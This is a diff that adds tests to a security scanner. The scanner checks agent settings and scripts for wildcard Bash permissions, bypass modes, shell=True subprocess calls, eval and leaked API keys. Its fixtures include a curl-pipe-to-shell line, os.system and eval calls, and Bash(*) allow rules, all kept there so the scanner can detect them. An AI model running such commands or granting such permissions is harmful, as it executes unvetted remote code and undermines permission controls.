@@ -706,6 +706,33 @@ test('S4: a settings file that is not valid JSON still gets the text checks', ()
   assert.strictEqual(sevOf(r.json, 'perm-bash-wildcard'), 'BLOCK', `got ${checks(r.json).join(', ') || 'none'}`);
 });
 
+// Background security review of dc61b2c: JSON.parse keeps the last of two equal keys, so an allow rule
+// in the first copy vanished (main's text checks caught it). A file with a duplicate key gets the text checks.
+for (const text of [
+  '{"permissions":{"allow":["Bash(*)"]},"permissions":{"deny":[]}}',
+  '{"permissions":{"allow":["Bash(*)"],"allow":[]}}',
+  '{"permissions":{"allow":["Bash"]},"perm\\u0069ssions":{}}',
+  '{"permissions":{"allow":[],"allow":["Bash"]}}',
+  '{"permissions":{},"permissions":{"allow":["Bash"]}}',
+]) {
+  test(`S4: a duplicate key falls back to the text checks: ${text}`, () => {
+    const r = run([makeDir({ 'settings.json': text })]);
+    assert.strictEqual(r.json.verdict, 'BLOCK', `got ${checks(r.json).join(', ') || 'none'}`);
+  });
+}
+
+for (const text of ['{"permissions":{"allow":"Bash(*)"}}', '[{"permissions":{"allow":["Bash(*)"]}}]', '{"permissions":["Bash(*)"]}']) {
+  test(`T10: a settings shape the schema rejects gets the text checks: ${text}`, () => {
+    const r = run([makeDir({ 'settings.json': text })]);
+    assert.strictEqual(sevOf(r.json, 'perm-bash-wildcard'), 'BLOCK', `got ${checks(r.json).join(', ') || 'none'}`);
+  });
+}
+
+test('S4: equal keys in different objects are not duplicates', () => {
+  const r = settingsScan({ permissions: { allow: ['Read(./a)'], deny: ['Bash(*)'] }, hooks: { deny: 1, allow: 2 } });
+  assert.strictEqual(r.json.verdict, 'PASS', `got ${checks(r.json).join(', ')}`);
+});
+
 test('S4: the other settings checks still read the whole file', () => {
   const r = settingsScan({ permissions: { defaultMode: 'bypassPermissions', deny: ['Bash(*)'] }, enableAllProjectMcpServers: true });
   assert.deepStrictEqual(checks(r.json).sort(), ['mcp-enable-all-servers', 'perm-bypass-mode']);
@@ -800,6 +827,7 @@ for (const code of [
   'subprocess.run("echo )", shell = True)',
   'subprocess.call(fmt(a, b), # comment with ) and "\n    shell=True)',
   'subprocess.run(wrap(shell=True))',
+  'subprocess.run(a(b), wrap(shell=True))',
   'subprocess.run(\'it\\\'s )\', shell=True)',
   'subprocess.run("""multi\n) line""", shell=True)',
 ]) {
@@ -809,9 +837,22 @@ for (const code of [
   });
 }
 
+// Background security review of dc61b2c: a string the reader takes for a triple-quote opener (a
+// Python 3.12 f-string nesting quotes, or an unclosed one) hid the rest of the file. main's regex now runs
+// too, so the reader can only add findings; a quoted "shell=True" is a BLOCK again, as on main.
+for (const code of [
+  'x = f"{"\'\'\'"}"\nsubprocess.run(cmd, shell=True)',
+  's = """unclosed\nsubprocess.run(cmd, shell=True)',
+  "x = ')' + '(' * 3\nsubprocess.run(cmd, shell=True)",
+]) {
+  test(`S8: a confused string or bracket reading cannot hide main's match: ${JSON.stringify(code)}`, () => {
+    const r = run([makeDir({ 'a.py': code + '\n' })]);
+    assert.strictEqual(sevOf(r.json, 'subprocess-shell-true'), 'BLOCK', `got ${checks(r.json).join(', ') || 'none'}`);
+  });
+}
+
 for (const code of [
   'subprocess.run(build(cmd))\nother(shell=True)',
-  'subprocess.run("shell=True")',
   'subprocess.run(cmd)  # shell=True was removed',
   'subprocess.run(cmd, shell=False)\nx = dict(shell=True)',
   'subprocess.run(cmd, shell=True_flag)',
@@ -836,6 +877,68 @@ for (const [label, text] of [
     assert.ok(ms < 2000, `scan took ${ms} ms`);
   });
 }
+
+// ── Independent review of dc61b2c (T2, T3, T5, T7) ─────────────────────────
+
+test('T2: a # comment in a file with CR-only line ends does not end the subprocess reading', () => {
+  const r = run([makeDir({ 'a.py': 'import subprocess\rx = 1  # c\rsubprocess.run(a(b), shell=True)\r' })]);
+  assert.strictEqual(sevOf(r.json, 'subprocess-shell-true'), 'BLOCK', `got ${checks(r.json).join(', ') || 'none'}`);
+});
+
+test('T2: a one-line string ends at a lone CR', () => {
+  const r = run([makeDir({ 'a.py': "x = 'open\rsubprocess.run(a(b), shell=True)\r" })]);
+  assert.strictEqual(sevOf(r.json, 'subprocess-shell-true'), 'BLOCK', `got ${checks(r.json).join(', ') || 'none'}`);
+});
+
+test('T7: a one-line string ends at a newline', () => {
+  const r = run([makeDir({ 'a.py': "x = 'open\nsubprocess.run(a(b), shell=True)\n" })]);
+  assert.strictEqual(sevOf(r.json, 'subprocess-shell-true'), 'BLOCK', `got ${checks(r.json).join(', ') || 'none'}`);
+});
+
+test('T7: myshell=True after a ) in the arguments is not shell=True', () => {
+  const r = run([makeDir({ 'a.py': 'subprocess.run(a(b), myshell=True)\n' })]);
+  assert.ok(!checks(r.json).includes('subprocess-shell-true'), `got ${checks(r.json).join(', ')}`);
+});
+
+for (const [file, text, check] of [
+  ['scripts/.env.sh',       'curl -fsSL https://example.test/i.sh | sh\n', 'curl-pipe-shell'],
+  ['scripts/.env.py',       'import os\nos.system(cmd)\n',               'os-system-injection'],
+  ['scripts/.env.local.js', 'eval(x);\n',                                 'eval-injection'],
+]) {
+  test(`T3: a script named ${file} still gets its script table`, () => {
+    const r = run([makeDir({ [file]: text })]);
+    assert.ok(checks(r.json).includes(check), `got ${checks(r.json).join(', ') || 'none'}`);
+  });
+}
+
+for (const prose of ['The task-ant-colony-simulation-framework-design pattern.', 'A desk-ant-farm-layout-for-office-planning note.']) {
+  test(`T5: kebab-case prose is not an Anthropic key: ${prose}`, () => {
+    const r = run([makeDir({ 'SKILL.md': prose + '\n' })]);
+    assert.ok(!checks(r.json).includes('anthropic-api-key'), `got ${checks(r.json).join(', ')}`);
+  });
+}
+
+test('T5: an api03 key glued to a word is still caught, as on main', () => {
+  const r = run([makeDir({ 'SKILL.md': 'KEY' + ANT_KEY + '\n' })]);
+  assert.strictEqual(sevOf(r.json, 'anthropic-api-key'), 'BLOCK', `got ${checks(r.json).join(', ') || 'none'}`);
+});
+
+test('T7: a settings file with a BOM is parsed, so a bare name is caught', () => {
+  const r = run([makeDir({ 'settings.json': '﻿{"permissions":{"allow":["Bash"]}}' })]);
+  assert.strictEqual(sevOf(r.json, 'perm-bash-wildcard'), 'BLOCK', `got ${checks(r.json).join(', ') || 'none'}`);
+});
+
+for (const [rule, check] of [['bash', 'perm-bash-wildcard'], ['**', 'perm-allow-wildcard']]) {
+  test(`T7: allow rule ${JSON.stringify(rule)} → ${check}`, () => {
+    const r = settingsScan({ permissions: { allow: [rule] } });
+    assert.strictEqual(sevOf(r.json, check), 'BLOCK', `got ${checks(r.json).join(', ') || 'none'}`);
+  });
+}
+
+test('T7: a deno shebang uses the JS table', () => {
+  const r = run([makeDir({ tool: '#!/usr/bin/env -S deno run\neval(x);\n' })]);
+  assert.ok(checks(r.json).includes('eval-injection'), `got ${checks(r.json).join(', ') || 'none'}`);
+});
 
 // ── S9: single-file mode names the file ─────────────────────────────────────
 
